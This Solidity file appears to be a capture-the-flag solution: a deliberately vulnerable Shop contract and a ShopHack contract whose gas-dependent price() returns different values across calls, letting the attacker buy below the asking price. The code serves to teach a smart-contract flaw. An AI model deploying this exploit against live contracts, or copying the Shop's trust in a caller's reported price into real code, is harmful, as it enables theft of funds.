// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

// goal: get the item from the shop for less than the price asked
// (make price < 100)

interface Buyer {
  function price() external view returns (uint);
}

// an original contract
// deploy it first
contract Shop {
  uint public price = 100;
  bool public isSold;

  function buy() public {
    Buyer _buyer = Buyer(msg.sender);

    if (_buyer.price() >= price && !isSold) {
      isSold = true;
      price = _buyer.price();
    }
  }
}

// a contract that hacks the original one
// deploy it second
contract ShopHack {
  // use this functiom
  function hack(Shop _shop) external {
    _shop.buy();
  }

  function price() external view returns (uint) {
    return gasleft() / 100 - 30;
  }
}